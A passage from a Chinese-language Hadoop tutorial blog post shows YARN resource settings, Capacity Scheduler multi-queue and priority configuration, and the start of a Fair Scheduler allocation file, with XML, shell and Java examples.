In other cases, number of vcores is 8 by default.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.cpu-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最小内存，默认1G --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The minimum allocation for every container request at theRM  in MBs. Memory requests lower than this will be set to the value of this  property. Additionally, a node manager that is configured to have less memory  than this value will be shut down by the resource manager.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1024<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最大内存，默认8G，修改为2G --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The maximum allocation for every container request at the RM  in MBs. Memory requests higher than this will throw an  InvalidResourceRequestException.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2048<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最小CPU核数，默认1个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The minimum allocation for every container request at the RM  in terms of virtual CPU cores. Requests lower than this will be set to the  value of this property. Additionally, a node manager that is configured to  have fewer virtual cores than this value will be shut down by the resource  manager.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 容器最大CPU核数，默认4个，修改为2个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The maximum allocation for every container request at the RM  in terms of virtual CPU cores. Requests higher than this will throw an</span><br><span class="line">  InvalidResourceRequestException.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- yarn对物理内存默认打开，建议打开 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.pmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!-- 虚拟内存检查，默认打开，修改为关闭 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether virtual memory limits will be enforced for</span><br><span class="line">  containers.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-check-enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 虚拟内存和物理内存设置比例,默认2.1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Ratio between virtual memory to physical memory when  setting memory limits for containers. Container allocations are  expressed in terms of physical memory, and virtual memory usage  is allowed to exceed this allocation by this ratio.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.vmem-pmem-ratio<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果集群的硬件资源不一致，要每个NodeManager单独配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启集群</span></span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"><span class="comment"># 执行WordCount程序</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br><span class="line"><span class="comment"># http://hadoop103:8088/cluster/apps</span></span><br></pre></td></tr></table></figure><h3 id="2-2-容量调度器多队列提交案例">2.2 容量调度器多队列提交案例</h3><ul><li>需求1：default队列占总内存的40%，最大资源容量占总资源60%，hive队列占总内存的60%，最大资源容量占总资源80%</li><li>需求2：配置队列优先级</li></ul><p>在<code>capacity-scheduler.xml</code>中配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--为新加队列添加必要属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定多队列，增加hive队列 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.queues<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>default,hive<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      The queues at the this level (root is the root queue).</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 降低default队列资源额定容量为40%，默认100% --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.default.capacity<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>40<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 降低default队列资源最大容量为60%，默认100% --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.default.maximum-capacity<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>60<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!------------------------为新加队列添加必要属性-------------------------&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定hive队列的资源额定容量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.capacity<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>60<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 用户最多可以使用队列多少资源，1表示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.user-limit-factor<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 指定hive队列的资源最大容量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.maximum-capacity<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>80<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 启动hive队列 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.state<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>RUNNING<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 哪些用户有权向队列提交作业 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.acl_submit_applications<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 哪些用户有权操作队列，管理员权限（查看/杀死） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.acl_administer_queue<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 哪些用户有权配置提交任务优先级 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.acl_application_max_priority<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 任务的超时时间设置：yarn application -appId appId -updateLifetime Timeout</span></span><br><span class="line"><span class="comment">参考资料：https://blog.cloudera.com/enforcing-application-lifetime-slas-yarn/ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果application指定了超时时间，则提交到该队列的application能够指定的最大超时时间不能超过该值。 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.maximum-application-lifetime<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果application没指定超时时间，则用default-application-lifetime作为默认值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.root.hive.default-application-lifetime<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分发配置文件，重启Yarn或者执行<code>yarn rmadmin -refreshQueues</code>刷新队列，就可以看到两条队列，然后像Hive提交任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向Hive队列提交任务</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -D mapreduce.job.queuename=hive /input /output</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打jar包的方式,默认的任务提交都是提交到default队列的。如果希望向其他队列提交任务，需要在Driver中声明</span></span><br><span class="line">public class WcDrvier &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line">        Configuration conf = new Configuration();</span><br><span class="line">        conf.set(<span class="string">"mapreduce.job.queuename"</span>,<span class="string">"hive"</span>);</span><br><span class="line">        //1. 获取一个Job实例</span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line">        。。。 。。。</span><br><span class="line">        //6. 提交Job</span><br><span class="line">        boolean b = job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? 0 : 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后说一下任务优先级，容量调度器，支持任务优先级的配置，在资源紧张时，优先级高的任务将优先获取资源。默认情况，Yarn将所有任务的优先级限制为0，若想使用任务的优先级功能，须开放该限制，修改<code>yarn-site.xml</code>文件，增加以下参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.cluster.max-application-priority&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;5&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发配置，并重启Yarn</span></span><br><span class="line">xsync yarn-site.xml</span><br><span class="line">sbin/stop-yarn.sh</span><br><span class="line">sbin/start-yarn.sh</span><br><span class="line"><span class="comment"># 模拟资源紧张环境，可连续提交以下任务，直到新提交的任务申请不到资源为止</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar pi 5 2000000</span><br><span class="line"><span class="comment"># 再次重新提交优先级高的任务</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar pi  -D mapreduce.job.priority=5 5 2000000</span><br><span class="line"><span class="comment"># 也可以通过以下命令修改正在执行的任务的优先级</span></span><br><span class="line"><span class="comment"># yarn application -appID &lt;ApplicationID&gt; -updatePriority 优先级</span></span><br><span class="line">yarn application -appID application_1611133087930_0009 -updatePriority 5</span><br></pre></td></tr></table></figure><h3 id="2-3-公平调度器案例">2.3 公平调度器案例</h3><blockquote><p>配置文件参考资料：<a href="https://hadoop.apache.org/docs/r3.1.3/hadoop-yarn/hadoop-yarn-site/FairScheduler.html" target="_blank" rel="noopener" title="https://hadoop.apache.org/docs/r3.1.3/hadoop-yarn/hadoop-yarn-site/FairScheduler.html">https://hadoop.apache.org/docs/r3.1.3/hadoop-yarn/hadoop-yarn-site/FairScheduler.html</a><br>任务队列放置规则参考资料：<a href="https://blog.cloudera.com/untangling-apache-hadoop-yarn-part-4-fair-scheduler-queue-basics/" target="_blank" rel="noopener" title="https://blog.cloudera.com/untangling-apache-hadoop-yarn-part-4-fair-scheduler-queue-basics/">https://blog.cloudera.com/untangling-apache-hadoop-yarn-part-4-fair-scheduler-queue-basics/</a></p></blockquote><p>创建两个队列，分别是test和atguigu（以用户所属组命名）。期望实现以下效果：若用户提交任务时指定队列，则任务提交到指定队列运行；若未指定队列，test用户提交的任务到root.group.test队列运行，atguigu提交的任务到root.group.atguigu队列运行（注：group为用户所属组）。公平调度器的配置涉及到两个文件，一个是<code>yarn-site.xml</code>，另一个是公平调度器队列分配文件<code>fair-scheduler.xml</code>（文件名可自定义）。</p><p>修改<code>yarn-site.xml</code>文件，加入以下参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.scheduler.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.resourcemanager.scheduler.fair.FairScheduler<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>配置使用公平调度器<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.fair.allocation.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/etc/hadoop/fair-scheduler.xml<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>指明公平调度器队列分配配置文件<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.fair.preemption<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>禁止队列间资源抢占<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置fair-scheduler.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allocations</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 单个队列中Application Master占用资源的最大比例,取值0-1 ，企业一般配置0.1 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queueMaxAMShareDefault</span>&gt;</span>0.5<span class="tag">&lt;/<span class="name">queueMaxAMShareDefault</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 单个队列最大资源的默认值 test atguigu default --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queueMaxResourcesDefault</span>&gt;</span>4096mb,4vcores<span class="tag">&lt;/<span class="name">queueMaxResourcesDefault</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 增加一个队列test --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queue</span> <span class="attr">name</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列最小资源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">minResources</span>&gt;</span>2048mb,2vcores<span class="tag">&lt;/<span class="name">minResources</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列最大资源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maxResources</span>&gt;</span>4096mb,4vcores<span class="tag">&lt;/<span class="name">maxResources</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列中最多同时运行的应用数，默认50，根据线程数配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maxRunningApps</span>&gt;</span>4<span class="tag">&lt;/<span class="name">maxRunningApps</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列中Application Master占用资源的最大比例 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maxAMShare</span>&gt;</span>0.5<span class="tag">&lt;/<span class="name">maxAMShare</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 该队列资源权重,默认值为1.0 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">weight</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">weight</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列内部的资源分配策略 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">schedulingPolicy</span>&gt;</span>fair<span class="tag">&lt;/<span class="name">schedulingPolicy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queue</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 增加一个队列atguigu --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">queue</span> <span class="attr">name</span>=<span class="string">"atguigu"</span> <span class="attr">type</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列最小资源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">minResources</span>&gt;</span>2048mb,2vcores<span class="tag">&lt;/<span class="name">minResources</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列最大资源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maxResources</span>&gt;</span>4096mb,4vcores<span class="tag">&lt;/<span class="name">maxResources</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列中最多同时运行的应用数，默认50，根据线程数配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maxRunningApps</span>&gt;</span>4<span class="tag">&lt;/<span class="name">maxRunningApps</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列中Application Master占用资源的最大比例,maxAMShare只能用于叶子队列 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 该队列资源权重,默认值为1.0 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">weight</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">weight</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 队列内部的资源分配策略 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">schedulingPolicy</span>&gt;</span>fair<span class="tag">&lt;/<span class="name">schedulingPolicy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">queue</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 任务队列分配策略,可配置多层规则,从第一个规则开始匹配,直到匹配成功 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span 